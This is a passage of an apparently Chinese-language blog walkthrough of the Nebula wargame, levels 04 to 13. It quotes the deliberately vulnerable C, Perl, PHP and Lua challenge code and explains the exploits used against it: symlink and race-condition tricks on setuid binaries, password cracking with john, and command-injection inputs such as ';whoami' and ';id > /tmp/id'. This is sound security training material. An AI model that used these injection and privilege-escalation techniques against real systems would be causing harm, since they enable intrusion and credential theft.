class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">1024</span>];</span><br><span class="line">  <span class="keyword">int</span> fd, rc;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(argc == <span class="number">1</span>) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"%s [file to read]\n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line">      <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(<span class="built_in">strstr</span>(argv[<span class="number">1</span>], <span class="string">"token"</span>) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"You may not access '%s'\n"</span>, argv[<span class="number">1</span>]);</span><br><span class="line">      <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  fd = open(argv[<span class="number">1</span>], O_RDONLY);</span><br><span class="line">  <span class="keyword">if</span>(fd == <span class="number">-1</span>) &#123;</span><br><span class="line">      err(EXIT_FAILURE, <span class="string">"Unable to open %s"</span>, argv[<span class="number">1</span>]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  rc = read(fd, buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span>(rc == <span class="number">-1</span>) &#123;</span><br><span class="line">      err(EXIT_FAILURE, <span class="string">"Unable to read fd %d"</span>, fd);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  write(<span class="number">1</span>, buf, rc);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析:查看文件<br><img src="https://upload-images.jianshu.io/upload_images/5443560-7ee53af01e3ece0d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br><code>token</code>这个文件的权限是<code>0600</code>，只允许flag04用户读取,没有读取权限。<br>但是flag04这个文件我们有执行权限，隶属于flag04用户，并且有suid。<br>简单分析源码，这个程序的主要功能就是读取文件输出。所以只要我们利用这个文件来读物token 就行，但是有个限制，就是读取的文件名不能叫做<code>token</code>。所以只需要利用软连接，建立一个名字中不含有<code>token</code>的文件，软链接到token 。</p><p><img src="https://upload-images.jianshu.io/upload_images/5443560-d30318a0f9bd3f7b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br><img src="https://upload-images.jianshu.io/upload_images/5443560-356a30698bc1a87e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><h2 id="0x06-level05"><a href="#0x06-level05" class="headerlink" title="0x06 level05"></a>0x06 level05</h2><blockquote><p>Check the flag05 home directory. You are looking for weak directory permissions<br>To do this level, log in as the level05 account with the password level05. Files for this level can be found in /home/flag05.</p></blockquote><p><img src="https://upload-images.jianshu.io/upload_images/5443560-8fec3b78daf9ddca.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>看到<code>.ssh</code>文件夹，推测可能是想通过ssh 登陆进来，但是<code>.ssh</code>文件夹的权限<code>700</code>。我们没有查看权限。这时候看到backup文件夹<br><img src="https://upload-images.jianshu.io/upload_images/5443560-a53be6bb86afe6bd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>看到一个备份文件夹。<br><img src="https://upload-images.jianshu.io/upload_images/5443560-17ad621643eb194c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>解压下，果然是<code>.ssh</code>的压缩，就可以利用私钥登陆<br><img src="https://upload-images.jianshu.io/upload_images/5443560-4c5f2065afbccb0f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br><img src="https://upload-images.jianshu.io/upload_images/5443560-801ef1892f28383a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>登陆成功</p><h2 id="0x07-level06"><a href="#0x07-level06" class="headerlink" title="0x07 level06"></a>0x07 level06</h2><blockquote><p>The flag06 account credentials came from a legacy unix system.<br>To do this level, log in as the level06 account with the password level06. Files for this level can be found in /home/flag06.</p></blockquote><p>通过这句话<code>The flag06 account credentials came from a legacy unix system.</code>，比较旧版本的Unix的密码是放在<code>/etc/passwd</code><br><img src="https://upload-images.jianshu.io/upload_images/5443560-a1d5b80a3510410a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>这个时候我们就可以用<code>john</code>爆破，这里用的是<code>kali</code>上自带的<br><img src="https://upload-images.jianshu.io/upload_images/5443560-484f9d9e3d8606ad.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>然后登陆</p><h2 id="0x08-level07"><a href="#0x08-level07" class="headerlink" title="0x08 level07"></a>0x08 level07</h2><blockquote><p>The flag07 user was writing their very first perl program that allowed them to ping hosts to see if they were reachable from the web server.<br>To do this level, log in as the level07 account with the password level07. Files for this level can be found in /home/flag07.<br>源码<br><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> CGI <span class="string">qw&#123;param&#125;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"Content-type: text/html\n\n"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">sub</span> <span class="title">ping</span> </span>&#123;</span><br><span class="line">  $host = $_[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">print</span>(<span class="string">"&lt;html&gt;&lt;head&gt;&lt;title&gt;Ping results&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;pre&gt;"</span>);</span><br><span class="line"></span><br><span class="line">  @output = <span class="string">`ping -c 3 $host 2&gt;&amp;1`</span>;</span><br><span class="line">  <span class="keyword">foreach</span> $line (@output) &#123; <span class="keyword">print</span> <span class="string">"$line"</span>; &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">print</span>(<span class="string">"&lt;/pre&gt;&lt;/body&gt;&lt;/html&gt;"</span>);</span><br><span class="line">  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># check if Host set. if not, display normal page, etc</span></span><br><span class="line"></span><br><span class="line">ping(param(<span class="string">"Host"</span>));</span><br></pre></td></tr></table></figure></p></blockquote><p>看这行代码<code>ping -c 3 $host 2&gt;&amp;1</code>,典型的命令注入，构造<code>host=127.0.01;whoami</code>就可以执行whoami</p><h2 id="0x09-level08"><a href="#0x09-level08" class="headerlink" title="0x09 level08"></a>0x09 level08</h2><blockquote><p>World readable files strike again. Check what that user was up to, and use it to log into flag08 account.<br>To do this level, log in as the level08 account with the password level08. Files for this level can be found in /home/flag08.</p></blockquote><p>看到一个流量包<br><img src="https://upload-images.jianshu.io/upload_images/5443560-b2096557d4e9ec72.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>wireshark 追踪流，以16进制形式展开<br><img src="https://upload-images.jianshu.io/upload_images/5443560-fd871199d9ea41db.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>其中<code>7f</code>是删除键,所以密码为<code>backd00Rmate</code></p><p><img src="https://upload-images.jianshu.io/upload_images/5443560-7aedc30548473071.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><h2 id="0x0A-level09"><a href="#0x0A-level09" class="headerlink" title="0x0A level09"></a>0x0A level09</h2><blockquote><p>There’s a C setuid wrapper for some vulnerable PHP code…<br>To do this level, log in as the level09 account with the password level09. Files for this level can be found in /home/flag09.</p></blockquote><p>源码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">spam</span><span class="params">($email)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  $email = preg_replace(<span class="string">"/\./"</span>, <span class="string">" dot "</span>, $email);</span><br><span class="line">  $email = preg_replace(<span class="string">"/@/"</span>, <span class="string">" AT "</span>, $email);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span> $email;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">markup</span><span class="params">($filename, $use_me)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  $contents = file_get_contents($filename);</span><br><span class="line"></span><br><span class="line">  $contents = preg_replace(<span class="string">"/(\[email (.*)\])/e"</span>, <span class="string">"spam(\"\\2\")"</span>, $contents);</span><br><span class="line">  $contents = preg_replace(<span class="string">"/\[/"</span>, <span class="string">"&lt;"</span>, $contents);</span><br><span class="line">  $contents = preg_replace(<span class="string">"/\]/"</span>, <span class="string">"&gt;"</span>, $contents);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> $contents;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$output = markup($argv[<span class="number">1</span>], $argv[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> $output;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><h2 id="0x0B-level10"><a href="#0x0B-level10" class="headerlink" title="0x0B level10"></a>0x0B level10</h2><blockquote><p>The setuid binary at <strong>/home/flag10/flag10</strong> binary will upload any file given, as long as it meets the requirements of the <a href="http://linux.die.net/man/2/access" target="_blank" rel="noopener">access()</a> system call.</p></blockquote><p>源码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *file;</span><br><span class="line">  <span class="keyword">char</span> *host;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(argc &lt; <span class="number">3</span>) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"%s file host\n\tsends file to host if you have access to it\n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  file = argv[<span class="number">1</span>];</span><br><span class="line">  host = argv[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(access(argv[<span class="number">1</span>], R_OK) == <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">int</span> fd;</span><br><span class="line">      <span class="keyword">int</span> ffd;</span><br><span class="line">      <span class="keyword">int</span> rc;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">sin</span>;</span></span><br><span class="line">      <span class="keyword">char</span> buffer[<span class="number">4096</span>];</span><br><span class="line"></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"Connecting to %s:18211 .. "</span>, host); fflush(<span class="built_in">stdout</span>);</span><br><span class="line"></span><br><span class="line">      fd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">      <span class="built_in">memset</span>(&amp;<span class="built_in">sin</span>, <span class="number">0</span>, <span class="keyword">sizeof</span>(struct sockaddr_in));</span><br><span class="line">      <span class="built_in">sin</span>.sin_family = AF_INET;</span><br><span class="line">      <span class="built_in">sin</span>.sin_addr.s_addr = inet_addr(host);</span><br><span class="line">      <span class="built_in">sin</span>.sin_port = htons(<span class="number">18211</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span>(connect(fd, (<span class="keyword">void</span> *)&amp;<span class="built_in">sin</span>, <span class="keyword">sizeof</span>(struct sockaddr_in)) == <span class="number">-1</span>) &#123;</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">"Unable to connect to host %s\n"</span>, host);</span><br><span class="line">          <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HITHERE <span class="meta-string">".oO Oo.\n"</span></span></span><br><span class="line">      <span class="keyword">if</span>(write(fd, HITHERE, <span class="built_in">strlen</span>(HITHERE)) == <span class="number">-1</span>) &#123;</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">"Unable to write banner to host %s\n"</span>, host);</span><br><span class="line">          <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">      &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">undef</span> HITHERE</span></span><br><span class="line"></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"Connected!\nSending file .. "</span>); fflush(<span class="built_in">stdout</span>);</span><br><span class="line"></span><br><span class="line">      ffd = open(file, O_RDONLY);</span><br><span class="line">      <span class="keyword">if</span>(ffd == <span class="number">-1</span>) &#123;</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">"Damn. Unable to open file\n"</span>);</span><br><span class="line">          <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      rc = read(ffd, buffer, <span class="keyword">sizeof</span>(buffer));</span><br><span class="line">      <span class="keyword">if</span>(rc == <span class="number">-1</span>) &#123;</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">"Unable to read from file: %s\n"</span>, strerror(errno));</span><br><span class="line">          <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      write(fd, buffer, rc);</span><br><span class="line"></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"wrote file!\n"</span>);</span><br><span class="line"></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"You don't have access to %s\n"</span>, file);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这是一种叫文件访问竞态条件的漏洞.维基百科里面介绍的很详细了<br><a href="https://en.wikipedia.org/wiki/Time_of_check_to_time_of_use" target="_blank" rel="noopener">Time_of_check_to_time_of_use</a>.<br>大体利用是这用的。先大体看下代码<br>首先通过access 验证是否有文件读取权限<code>if(access(argv[1], R_OK) == 0)</code>。前面有说到<code>suid</code>会在执行的时候暂时性拥有文件拥有者的权限。这个在底层代码里面体现为<code>euid</code>，即<code>有限的uid</code>，比如我当前用户是<code>level10</code>,uid为<code>1011</code>，那执行正常的程序的时候我们<code>euid=uid=1011</code>，但是在有<code>suid</code>的程序中，<code>euid=文件拥有者的uid=flag10的uid=989</code>。一般的判断都是通过euid。<br>但是这里有个意外，就是<code>access</code>是通过<code>uid</code>而不是<code>euid</code>。所以这里，执行者为<code>level10</code>，没有执行的权限，验证不通过。<br>维基百科上给出的利用条件是利用软连接<br>代码是这样的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if(access(文件名, R_OK) == 0) &#123;</span><br><span class="line">        ...</span><br><span class="line">ffd = open(file, O_RDONLY);</span><br><span class="line">...</span><br><span class="line">rc = read(ffd, buffer, sizeof(buffer));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>我们用个软连接，让access之前lntoken 链接到 faketoken，这里的话，level10对 faketoken具有读取权限，验证通过。。接下来在open之前。把<br>lntoken 链接到token，这个时候由于是suid，而且open 验证的是euid。所以读取成功。我们想实现的伪代码如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ln -sf faketoken lntoken</span><br><span class="line">if(access(文件名, R_OK) == 0) &#123; =&gt; 验证通过</span><br><span class="line">      ln -sf realtoken lntoken =&gt; 已经指向正确的token 了</span><br><span class="line">        ...</span><br><span class="line">ffd = open(file, O_RDONLY);</span><br><span class="line">...</span><br><span class="line">rc = read(ffd, buffer, sizeof(buffer));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这种现象在单线程下几乎不可能，控制到那么精准的时间更换软连接。<br>但是现在的Linux几乎是多线程的，就可以条件竞争。<br>具体利用如下<br>新建fakeotkoen<br><img src="https://upload-images.jianshu.io/upload_images/5443560-0f2d1200236ef762.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>新建个不断软连接的死循环，这里我用<code>-x</code> 方便看到具体过程<br><img src="https://upload-images.jianshu.io/upload_images/5443560-1a8cd7ab4c2f8ea4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br><img src="https://upload-images.jianshu.io/upload_images/5443560-09cf1de358ac6548.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>再看一个终端，不断执行程序<br><img src="https://upload-images.jianshu.io/upload_images/5443560-a4762cc935be3785.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png">。</p><p>接收到真的token<br><img src="https://upload-images.jianshu.io/upload_images/5443560-c4689c881e588181.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>可以登录了</p><h2 id="0x0C-level11"><a href="#0x0C-level11" class="headerlink" title="0x0C level11"></a>0x0C level11</h2><blockquote><p>The /home/flag11/flag11 binary processes standard input and executes a shell command.<br>There are two ways of completing this level, you may wish to do both :-)</p></blockquote><h2 id="0x0D-level12"><a href="#0x0D-level12" class="headerlink" title="0x0D level12"></a>0x0D level12</h2><blockquote><p>There is a backdoor process listening on port 50001.</p></blockquote><p>源码<br><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">local</span> socket = <span class="built_in">require</span>(<span class="string">"socket"</span>)</span><br><span class="line"><span class="keyword">local</span> server = <span class="built_in">assert</span>(socket.bind(<span class="string">"127.0.0.1"</span>, <span class="number">50001</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hash</span><span class="params">(password)</span></span></span><br><span class="line">  prog = <span class="built_in">io</span>.<span class="built_in">popen</span>(<span class="string">"echo "</span>..password..<span class="string">" | sha1sum"</span>, <span class="string">"r"</span>)</span><br><span class="line">  data = prog:<span class="built_in">read</span>(<span class="string">"*all"</span>)</span><br><span class="line">  prog:<span class="built_in">close</span>()</span><br><span class="line"></span><br><span class="line">  data = <span class="built_in">string</span>.<span class="built_in">sub</span>(data, <span class="number">1</span>, <span class="number">40</span>)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> data</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span> <span class="keyword">do</span></span><br><span class="line">  <span class="keyword">local</span> client = server:accept()</span><br><span class="line">  client:send(<span class="string">"Password: "</span>)</span><br><span class="line">  client:settimeout(<span class="number">60</span>)</span><br><span class="line">  <span class="keyword">local</span> line, err = client:receive()</span><br><span class="line">  <span class="keyword">if</span> <span class="keyword">not</span> err <span class="keyword">then</span></span><br><span class="line">      <span class="built_in">print</span>(<span class="string">"trying "</span> .. line) <span class="comment">-- log from where ;\</span></span><br><span class="line">      <span class="keyword">local</span> h = hash(line)</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> h ~= <span class="string">"4754a4f4bd5787accd33de887b9250a0691dd198"</span> <span class="keyword">then</span></span><br><span class="line">          client:send(<span class="string">"Better luck next time\n"</span>);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">          client:send(<span class="string">"Congrats, your token is 413**CARRIER LOST**\n"</span>)</span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  client:<span class="built_in">close</span>()</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure></p><p>看下这个程序，就是把你输入的密码经过hash后跟<code>4754a4f4bd5787accd33de887b9250a0691dd198</code>比较，如果一样，就<br>输出<code>Congrats, your token is 413**CARRIER LOST**</code>。这里面的hash是自定义的<br><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hash</span><span class="params">(password)</span></span></span><br><span class="line">  prog = <span class="built_in">io</span>.<span class="built_in">popen</span>(<span class="string">"echo "</span>..password..<span class="string">" | sha1sum"</span>, <span class="string">"r"</span>)</span><br><span class="line">  data = prog:<span class="built_in">read</span>(<span class="string">"*all"</span>)</span><br><span class="line">  prog:<span class="built_in">close</span>()</span><br><span class="line"></span><br><span class="line">  data = <span class="built_in">string</span>.<span class="built_in">sub</span>(data, <span class="number">1</span>, <span class="number">40</span>)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> data</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure></p><p>。问题就出再popen里面<code>prog = io.popen(&quot;echo &quot;..password..&quot; | sha1sum&quot;, &quot;r&quot;)</code>。通过调用系统命令来获取<code>hash</code>的。这一步拼接字符串，造成任意命令执行。<br>所以我们构造<code>;id &gt; /tmp/id</code>看看<br><img src="https://upload-images.jianshu.io/upload_images/5443560-bb28c87f585db5a0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>是<code>flag12</code>的</p><h2 id="0x0E-level13"><a href="#0x0E-level13" class="headerlink" title="0x0E level13"></a>0x0E level13</h2><blockquote><p>There is a security check that prevents the program from continuing execution if the user invoking it does not match a specific user id.</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;sys/types.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">#define FAKEUID 1000</span><br><span class="line"></span><br><span class="line">int main(int argc, char **argv, char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  int c;</span><br><span class="line">  char token[256];</span><br><span class="line"></span><br><span class="line">  if(getuid() != FAKEUID) &#123;</span><br><span class="line">      printf(&quot;Security failure detected. UID %d started us, we expect %d\n&quot;, getuid(), FAKEUID);</span><br><span class="line">      printf(&quot;The system administrators will be notified of this violation\n&quot;);</span><br><span class="line">      exit(EXIT_FAILURE);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // snip, sorry :)</span><br><span class="line"></span><br><span class="line">  printf(&quot;your token is %s\n&quot;, token);</span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这是一道简单的ELF逆向题，我这里提供两种思路<br>第一种动态调试.我用的是IDA.<br>在IDA的<code>dbgsrv</code>文件夹底下将<code>linux_server</code>拷贝到Linux服务器上运行，<br><img src="https://upload-images.jianshu.io/upload_images/5443560-9763e2be88a4e633.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>，然后打开ida 。<code>Debugger</code> -&gt; <code>run</code> -&gt; <code>remote Linux debugger</code><br>然后开始配置<br><img 